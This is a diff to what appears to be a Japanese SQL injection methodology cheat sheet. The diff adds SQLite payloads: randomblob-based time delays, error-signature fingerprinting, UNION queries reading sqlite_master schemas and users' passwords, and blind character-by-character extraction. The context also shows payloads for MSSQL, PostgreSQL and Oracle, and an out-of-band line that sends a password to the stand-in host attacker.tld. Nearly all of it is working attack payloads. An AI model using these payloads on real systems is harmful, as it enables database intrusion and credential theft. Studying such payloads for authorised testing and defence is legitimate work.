@@ -11,9 +11,10 @@
 '; WAITFOR DELAY '0:0:5'-- → MSSQL
 ' AND pg_sleep(5)--     → PostgreSQL
 ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- → Oracle
+' AND randomblob(99999999)-- → SQLite (SLEEP 関数が無い、 計算負荷で時間差を作る)
 ```
 
-エラーメッセージ ("You have an error in your SQL syntax" → MySQL、"ORA-" → Oracle、"PG::" → PostgreSQL、"Microsoft SQL Server" → MSSQL) と関数応答 (`@@version`、`version()`、`banner FROM v$version`) でエンジン同定。
+エラーメッセージ ("You have an error in your SQL syntax" → MySQL、"ORA-" → Oracle、"PG::" → PostgreSQL、"Microsoft SQL Server" → MSSQL、"unrecognized token" / "no such table" / "no such column" → SQLite) と関数応答 (`@@version`、`version()`、`banner FROM v$version`、`sqlite_version()`) でエンジン同定。
 
 ## Phase 2 — 列数特定と UNION-based 抽出
 
@@ -27,6 +28,16 @@
 ```
 
 文字列型一致が必要な場合は `' UNION SELECT 'a','b',...`。
+
+SQLite には `information_schema` が無く、 `sqlite_master` を使う:
+
+```
+' UNION SELECT NULL,NULL--                                          ← 列数決定 (このまま試す)
+' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--    ← table + CREATE 文を一括取得
+' UNION SELECT username, password FROM users--                       ← 列名は CREATE 文から読取り
+```
+
+MySQL の `information_schema` がフィルタされる場合の Oracle 代替は `all_tables` / `all_tab_columns`、 PostgreSQL は `pg_catalog.pg_tables` / `pg_attribute`。
 
 ## Phase 3 — error-based 抽出 (応答に直接表示されない場合)
 
@@ -44,7 +55,9 @@ boolean-based:
   AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
   → 1 文字ずつ二分探索
 time-based:
-  AND IF(SUBSTRING((SELECT password ...),1,1)='a', SLEEP(5), 0)
+  AND IF(SUBSTRING((SELECT password ...),1,1)='a', SLEEP(5), 0)            ← MySQL
+  AND CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'
+       THEN randomblob(50000000) ELSE 0 END                                ← SQLite (SLEEP 不在のため heavy compute で代替)
 out-of-band (MySQL Windows / SQL Server):
   AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.tld\\\\a'))
 ```
